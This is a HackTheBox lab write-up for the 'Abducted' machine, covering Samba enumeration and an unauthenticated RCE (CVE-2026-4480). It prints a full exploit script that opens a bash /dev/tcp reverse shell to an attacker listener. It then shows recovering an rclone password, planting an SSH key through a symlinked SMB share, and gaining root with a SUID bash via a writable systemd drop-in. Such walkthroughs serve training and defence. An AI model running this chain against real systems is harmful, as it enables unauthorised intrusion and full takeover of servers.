---
title: "HTB - Abducted"
date: 2026-06-07
tags: ["HackTheBox", "Linux", "SMB", "CVE-2026-4480", "PrivEsc"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Abducted.png"
---
**Difficulty:** Medium | **OS:** Linux

---

## Logo & Name Analysis - First Impressions

Before touching a single tool, the machine logo and name already give away a significant amount of information to an experienced player.

### The Logo

The machine logo shows two penguins (Tux) standing side by side against a red background, enclosed in an orange circle. On HackTheBox, machine logos almost always hint directly at the technology or theme involved.

**What the logo tells us immediately:**
- **Two penguins (Tux):** Linux is the operating system, and the dual penguins suggest multiple Linux users, user pivoting, or lateral movement between accounts.
- **Red background:** Danger or urgency, indicating a critical vulnerability or high-impact exploit path.
- **Orange border:** A warm, inviting exterior hiding something dangerous inside.

### The Name

"Abducted" combined with the logo points toward:
- Something being taken or hijacked. In a cybersecurity context, this could mean session hijacking, credential theft, or file/user impersonation.
- A scenario where access is "abducted" from one user to another through misconfigurations or chained exploits.

### The Instant Hypothesis

Combining name and logo before even running nmap:
> *"This is a Linux machine with multiple user accounts. The name 'Abducted' suggests credential theft or user impersonation. The dual penguins hint at lateral movement between Linux users. The foothold likely involves a Linux service exploit, and privilege escalation chains through multiple users via stolen credentials or misconfigured file permissions."*

This hypothesis is confirmed: the box chains through `nobody` -> `scott` -> `marcus` -> `root` via credential reuse and SMB misconfigurations.

<!--more-->

---

## Summary

Abducted is a medium-difficulty Linux box centred around a Samba file server. The attack chain begins with unauthenticated RCE via CVE-2026-4480 (Samba print command `%J` injection), pivots through two local users using credential reuse and an insecure SMB share configuration, and escalates to root by abusing a group-writable systemd drop-in directory.

---

## Reconnaissance

### Nmap

```bash
nmap -sCV <MACHINE_IP>
```

Open ports:

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 139 | NetBIOS | Samba smbd 4 |
| 445 | SMB | Samba smbd 4 |

### SMB Enumeration

Null session is permitted, revealing the server info:

```bash
rpcclient -U "" -N 10.129.244.177 -c "srvinfo"
```

```
ABDUCTED    Wk Sv PrQ Unx NT SNT Hartley Group Document Services
os version: 6.1
```

Share enumeration:

```bash
smbclient -L //10.129.244.177 -N
```

```
Sharename     Type    Comment
HP-Reception  Printer Reception printer
projects      Disk    Hartley Group Project Files
transfer      Disk    Staff file transfer
IPC$          IPC     IPC Service
```

The `HP-Reception` printer share stands out immediately as a guest-accessible printer.

---

## Foothold - CVE-2026-4480

### Vulnerability

CVE-2026-4480 is an unauthenticated RCE in Samba's printing subsystem (CVSS 10.0). When `printing = sysv` is configured and the `print command` contains the `%J` substitution character, Samba passes the client-controlled job description string to the shell without escaping metacharacters. By default, printer shares allow guest access, making this exploitable with no credentials.

The vulnerable configuration in `/etc/samba/shares.conf`:

```ini
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
```

The `%J` is the job description field, which is attacker-controlled via the `DocumentInfo1.document_name` field in the SPOOLSS RPC protocol.

### Exploit

The PoC (by TheCyberGeek, available at https://github.com/TheCyberGeek/CVE-2026-4480-PoC) uses the Samba Python bindings to open the guest printer, set the document name to a shell injection payload, and trigger it via `EndDocPrinter`.

```python
#!/usr/bin/env python3
"""
CVE-2026-4480 - Samba print-command (%J) injection -> unauthenticated RCE.
Made by TheCyberGeek @ HackTheBox
"""
import argparse
import sys
try:
    from samba.dcerpc import spoolss
    from samba.param import LoadParm
    from samba.credentials import Credentials
except ImportError:
    sys.exit("[-] Samba Python bindings missing. Install with: sudo apt install python3-samba")

PRINTER_ACCESS_USE = 0x00000008

def reverse_shell(lhost, lport):
    return ("setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n"
            % (lhost, lport)).encode()

def exploit(rhost, printer, body):
    lp = LoadParm()
    lp.load_default()
    creds = Credentials()
    creds.guess(lp)
    creds.set_anonymous()
    binding = r"ncacn_np:%s[\pipe\spoolss]" % rhost
    iface = spoolss.spoolss(binding, lp, creds)
    handle = iface.OpenPrinter("\\\\%s\\%s" % (rhost, printer), "",
                               spoolss.DevmodeContainer(), PRINTER_ACCESS_USE)
    info = spoolss.DocumentInfo1()
    info.document_name = "|sh"                 # lands in %J
    info.output_file = None
    info.datatype = "RAW"
    ctr = spoolss.DocumentInfoCtr()
    ctr.level = 1
    ctr.info = info
    iface.StartDocPrinter(handle, ctr)
    iface.StartPagePrinter(handle)
    iface.WritePrinter(handle, body, len(body))  # %s (spool body, run as script)
    iface.EndPagePrinter(handle)
    iface.EndDocPrinter(handle)                  # triggers print command server-side
    iface.ClosePrinter(handle)

def main():
    p = argparse.ArgumentParser(
        description="CVE-2026-4480 Samba print %J injection -> reverse shell")
    p.add_argument("rhost", help="target Samba host/IP")
    p.add_argument("lhost", help="your listener IP (e.g. tun0)")
    p.add_argument("lport", type=int, help="your listener port")
    p.add_argument("-P", "--printer", default="HP-Reception",
                   help="guest printer share name (default: HP-Reception)")
    p.add_argument("-c", "--cmd",
                   help="run this shell command instead of a reverse shell")
    args = p.parse_args()
    if args.cmd:
        body = (args.cmd.rstrip("\n") + "\n").encode()
    else:
        body = reverse_shell(args.lhost, args.lport)
    print("[*] target   : %s (\\\\%s\\%s)" % (args.rhost, args.rhost, args.printer))
    if not args.cmd:
        print("[*] callback : %s:%d  (start a listener first: nc -lvnp %d)"
              % (args.lhost, args.lport, args.lport))
    try:
        exploit(args.rhost, args.printer, body)
    except Exception as e:
        sys.exit("[-] exploit failed: %s" % e)
    print("[+] print job submitted -- check your listener")

if __name__ == "__main__":
    main()
```

### Usage

```bash
# Terminal 1: start listener
nc -lvnp 4444

# Terminal 2: fire the exploit
python3 exploit.py 10.129.244.177 10.10.14.100 4444
```

This lands a shell as `nobody` inside `/var/spool/samba`.

---

## User Flag (scott)

### Credential Discovery

Navigating to `/opt/offsite-backup` reveals an rclone configuration used to sync project files to an offsite SFTP server:

```bash
cat /opt/offsite-backup/rclone.conf
```

```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

The password is rclone-obfuscated. Revealing it:

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
# iXzvcib3SrpZ
```

### SSH as scott

Password reuse gets us in:

```bash
ssh scott@10.129.244.177
# password: iXzvcib3SrpZ
```




---

## Lateral Movement - scott to marcus

### Share Analysis

Reading `/etc/samba/shares.conf` reveals a critical misconfiguration in the `transfer` share:

```ini
[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

Combined with the global settings:

```ini
unix extensions = no
allow insecure wide links = yes
```

The `force user = marcus` directive means any file written through the SMB share is created as marcus. With `wide links = yes` and `unix extensions = no`, Samba follows symlinks outside the share root. Together these allow writing to marcus's home directory by planting a symlink and connecting via SMB.

### Planting the SSH Key

```bash
# Generate a key pair
ssh-keygen -q -t ed25519 -N '' -f /tmp/k

# Plant symlink pointing to marcus's home
ln -s /home/marcus /srv/transfer/mh

# Write authorized_keys through SMB (force user = marcus creates it as marcus)
smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
```

The key point is connecting via `127.0.0.1` so the SMB connection goes through Samba and `force user = marcus` is applied. Direct filesystem writes as scott would create files owned by scott, which SSH would reject.

### SSH as marcus

```bash
ssh -i /tmp/k marcus@127.0.0.1
```

---

## Privilege Escalation - marcus to root

### Group Membership

```bash
id
# uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

Marcus is a member of the `operators` group, described in the box lore as the infrastructure team.

### Writable systemd Drop-in

```bash
ls -ld /etc/systemd/system/smbd.service.d/
# drwxrws--- 2 root operators 4096 Jun 4 13:41 /etc/systemd/system/smbd.service.d/
```

The `s` in `drwxrws---` is the setgid bit, meaning files created inside inherit the `operators` group. Since marcus is in `operators`, the directory is writable. Any `.conf` file placed here is a systemd drop-in that merges with `smbd.service`. The `ExecStartPre=` directive runs as the service user (root) before smbd starts.

### Exploitation

```bash
# Drop a malicious override
echo '[Service]
ExecStartPre=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"' \
  > /etc/systemd/system/smbd.service.d/pwn.conf

# Reload and restart
systemctl daemon-reload
systemctl restart smbd

# Spawn root shell
/tmp/rootbash -p
whoami
# root

cat /root/root.txt
```

---

## Attack Chain

```
Unauthenticated
     |
     v
CVE-2026-4480 (Samba %J print command injection)
     |
     v
nobody shell (/var/spool/samba)
     |
     v
rclone.conf credentials in /opt/offsite-backup
     |
     v
SSH as scott (password reuse: iXzvcib3SrpZ)
     |
     v
SMB force user + wide links symlink attack
     |
     v
SSH as marcus (authorized_keys planted as marcus)
     |
     v
operators group + writable systemd drop-in
     |
     v
root (ExecStartPre SUID bash)
```

---

## Key Takeaways

- **CVE-2026-4480**: Samba `sysv` printing with `%J` in the print command is unauthenticated RCE. Switch to `printing = cups` or remove `%J` if a custom print command is required.
- **rclone obfuscation is not encryption**: Credentials stored in `rclone.conf` are trivially reversible with `rclone reveal`.
- **SMB force user + wide links**: This combination allows a low-privileged SMB user to write files as another user anywhere on the filesystem. Never combine these settings.
- **Group-writable systemd drop-ins**: Any group that can write to a `.service.d/` directory can achieve root-level code execution on the next service restart.

<span id="no-password" style="display:none;">Z3R0S_NO_PASSWORD_PLEASE</span>
